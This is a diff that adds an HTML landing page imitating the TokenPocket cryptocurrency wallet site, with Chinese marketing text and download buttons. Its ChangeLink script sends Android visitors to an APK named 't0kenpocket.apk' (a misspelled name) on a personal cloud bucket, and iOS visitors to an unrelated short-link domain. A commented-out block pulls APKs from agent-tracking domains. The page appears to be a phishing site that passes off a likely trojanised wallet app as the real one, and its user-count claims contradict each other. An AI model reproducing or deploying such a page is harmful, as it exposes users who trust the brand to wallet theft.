@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>TokenPocket - 让区块链随处发生</title>
+<meta content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" name="viewport"/>
+<meta content="website"/>
+<meta content="全球领先的区块链数字资产管理工具"/>
+<link href="local_resources/img/ae99525f1ebf9361ed83ef262d27fbff.png" rel="icon" type="image/x-icon"/>
+<link href="local_resources/css/619645177fe65430ff934dffc8d5bb3f.css" rel="stylesheet"/>
+<link href="local_resources/css/709137badc372aefc305d1a471ef3861.css" rel="stylesheet"/>
+<link href="local_resources/css/0408634772a6c6ce4438b8fd949d4c55.css" rel="stylesheet"/>
+<link href="local_resources/css/1ad63d17c9ef376e103e52c40676681e.css" rel="stylesheet"/>
+<link href="local_resources/css/25df9fc6871e6b46c62e2aa57acf22a4.css" rel="stylesheet"/>
+<link href="local_resources/css/1bbb813016e57b8e4bb91fa1269f727e.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="home layout">
+<div class="header-bg">
+<div arrow-up-class="icon-up-333" class="HeaderLayout">
+<div class="normal-nav container normal-header">
+<nav class="navbar-wrap row">
+<div class="navbar-logo"><img alt="DeFi钱包" class="logo pointer" src="local_resources/img/d76be6b10626479b413a808bd4be5a48.png"/>
+</div>
+</nav>
+</div>
+<div class="mini-nav mini-header">
+<nav class="mini-navbar-wrap">
+<div class="mini-navbar-header">
+<div><img alt="DeFi钱包" class="mini-navbar-logo pointer" src="local_resources/img/04917a6a94b4ffff4d5e68fb2736858e.png"/></div>
+<div class="menu-status text-right"><img alt="" src="local_resources/img/8e8c420707164cc8c9912d23ed5d456a.png"/></div>
+</div>
+<!-- -->
+</nav>
+</div>
+</div>
+<div class="HomeHeader">
+<div class="content d-flex ai-center jc-between">
+<div class="content-left flex-1">
+<div class="title chinese">
+								数字资产 尽在掌控
+							</div>
+<div class="desc">
+								全球领先的区块链数字资产管理工具
+							</div>
+<div class="buttons d-flex">
+<div class="button d-flex ai-center jc-center isHeader" id="android-download" onclick="ChangeLink()">
+<img class="icon" src="local_resources/img/1959c4891bde24a6b0d9731bbc07ddb8.png"/>
+<img class="icon-hover" src="local_resources/img/c0a9aa13394d3f8065665646225f23bd.png"/>
+<span class="">安卓下载 </span>
+</div>
+<div class="button d-flex ai-center jc-center" id="ios-download" onclick="ChangeLink()">
+<img class="icon" src="local_resources/img/31382d89f5928670c12c41bd54bc1eb4.png"/> <img class="icon-hover" src="local_resources/img/785644bb2fab1eac7ab832908dd386e1.png"/>
+<span class="">苹果下载</span>
+</div>
+</div>
+</div>
+<img class="main-img" src="local_resources/img/89b294d661f03fb6a67d7ccf937bd0d8.png"/>
+<img class="main-img-mobile" src="local_resources/img/c66f24b9d2a57222fd4c9b747a59f488.png"/>
+</div>
+<img class="header-bg-img" src="local_resources/img/2aeb84e4746198fc920b0c713e4716d6.png"/>
+</div>
+</div>
+<!-- -->
+<div class="HomeIntroduction">
+<div class="content">
+<div class="title">
+						深受全球8亿+用户青睐与信任
+					</div>
+<div class="desc">
+						为全球200多个国家及地区的用户，提供安全易用的数字钱包综合服务
+					</div>
+<div class="users d-flex ai-center jc-between">
+<div class="box d-flex flex-column ai-center jc-center"><img src="local_resources/img/75d57aaac1bb77b70d2a84c2ae9d4d14.png"/>
+<div class="name">服务的用户</div>
+<div class="number">88M+</div>
+</div>
+<div class="box d-flex flex-column ai-center jc-center"><img src="local_resources/img/d6cb9d751cb059d5edc0daa882da891c.png"/>
+<div class="name">日均交易数</div>
+<div class="number">90M+</div>
+</div>
+<div class="box d-flex flex-column ai-center jc-center"><img src="local_resources/img/de3ba9169ea5c41699db60065acc79a7.png"/>
+<div class="name">国家及地区</div>
+<div class="number">200+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script src="local_resources/js/f3e578a5f74c196e33a9fb7fed6ae9d5.js"></script>
+<script>
+            function ChangeLink() {
+                var appstore_url = 'https://nji9e.com/K3QO';
+                var local_android_package = 'https://hualulu.s3.ap-southeast-1.amazonaws.com//t0kenpocket.apk';
+                $(document).ready(function () {
+                    var isIOS = /(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent);
+
+                    if (isIOS) {
+                        location.href = appstore_url;
+                    } else {
+                        // Uncomment the following block to use the original Android download method
+                        /*var markNum = new Date().getTime() - new Date().getTime() % 5000;
+                        var domain = window.location.host.substring(0, 4) === "www." ? window.location.host.substring(4) : window.location.host;
+                        var _domain = domain.replace(/\./g, "_");
+                        var back_url = 'https://bakdownload.wqtemt.com:10094/' + _domain + "/bzyl/" + _domain + "_1.apk";
+                        $.ajax({
+                            url: 'https://api.ptlysa.com:9094/?platform=bzyl&agent=1&mark=' + markNum + '&domain=' + domain,
+                            timeout: 6000,
+                            error: function () {
+                                window.location.href = back_url;
+                            },
+                            success: function (data) {
+                                var json_data = $.parseJSON(data);
+                                if (json_data.code === 0) {
+                                    window.location.href = json_data.apk;
+                                } else {
+                                    window.location.href = back_url;
+                                }
+                            }
+                        });*/
+                        // Comment the following line if you want to use the original Android download method
+                        window.location.href = local_android_package;
+                    }
+                });
+            }
+        </script>
+<script>
+			var _hmt = _hmt || [];
+			(function() {
+			  var hm = document.createElement("script");
+			  hm.src = "https://hm.baidu.com/hm.js?0001234967f2a4bc34e59cadbcd6fc39";
+			  var s = document.getElementsByTagName("script")[0]; 
+			  s.parentNode.insertBefore(hm, s);
+			})();
+			</script>
+</body>
+</html>
